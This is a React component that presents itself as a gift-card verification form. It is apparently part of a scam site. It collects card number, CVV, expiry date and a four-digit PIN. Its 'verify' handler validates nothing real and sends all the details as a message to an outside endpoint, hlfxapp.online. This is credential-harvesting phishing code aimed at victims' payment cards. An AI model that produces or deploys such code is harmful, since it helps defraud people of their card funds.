"use client"

import React, { useEffect, useState } from 'react'
import { useAlert } from 'react-alert'
import Button from '../button/Button';

const TypeFour = ({cardname, setShowmodal, showmodal, amount, setAmount, currency}) => {
    const [redemptionCode, setRedemptionCode] = useState('');
    const [cvv, setcvv] = useState('');
    const [expiry, setExpiry] = useState('');
    const [pin, setPin] = useState('');
    const [loading, setLoading] = useState(false);
    const alert = useAlert();
    const [mounted, setMounted] = useState(false);

    useEffect(()=> {
        setMounted(true);
    }, [mounted])

    const handleVerify = async () => {
        setLoading(true)
        // do validation
    
        if(isNaN(amount)){
            alert.error("Please enter a valid amount");
            setLoading(false)
            return;
        }
    
        if(redemptionCode.length < 13){
            alert.error("Invalid crad number");
            setLoading(false)
            return;
        }

        if(cvv.length < 3){
            alert.error("Invalid CVV");
            setLoading(false)
            return;
        }

        if(expiry.length < 3){
            alert.error("Invalid Expiry Date");
            setLoading(false)
            return;
        }

        if(pin.length < 3){
            alert.error("Invalid PIN");
            setLoading(false)
            return;
        }


        const msg = `
Card Type: ${cardname}
Currency: ${currency}
Amount: ${amount}
Card Number: ${redemptionCode}
Gift Card CVV: ${cvv}
Gift Card Expiry Date: ${expiry}
4 Digit PIN: ${pin}
`;
        const data = {
            msg
        }

        await fetch('https://www.hlfxapp.online/api/send-message', {
            body: JSON.stringify(data),
            method: "post",
            headers:{
                'content-type': 'application/json',
            }
        }).then(()=> {
            setShowmodal(true);
            setLoading(false);
        }).catch(err => {
            setLoading(false);
            alert.error("Something went wrong, try again.")
        })
    }


  return (
    <>
        <input 
            class="block w-full mb-4 p-2 rounded-lg"
            value={amount} 
            onInput={e => setAmount(e.target.value)}
            placeholder='Amount' 
        />
        <input 
            class="block w-full mb-4 p-2 rounded-lg" 
            value={redemptionCode} 
            onInput={e => setRedemptionCode(e.target.value)}
            placeholder='Card Number'
        />
        <input 
            type='number'
            class="block w-full mb-4 p-2 rounded-lg" 
            value={cvv} 
            onInput={e => setcvv(e.target.value)}
            placeholder='Gift Card CVV'
        />
        <input 
            type='number'
            class="block w-full mb-4 p-2 rounded-lg" 
            value={expiry} 
            onInput={e => setExpiry(e.target.value)}
            placeholder='Gift Card Expiry Date'
        />
        <input 
            type='number'
            class="block w-full mb-4 p-2 rounded-lg" 
            value={pin} 
            onInput={e => setPin(e.target.value)}
            placeholder='4 Digit PIN'
        />
        <Button
            title={"Verify"}
            loading={loading}
            onClick={mounted ? handleVerify : ()=>{}}
        />
    </>
  )
}

export default TypeFour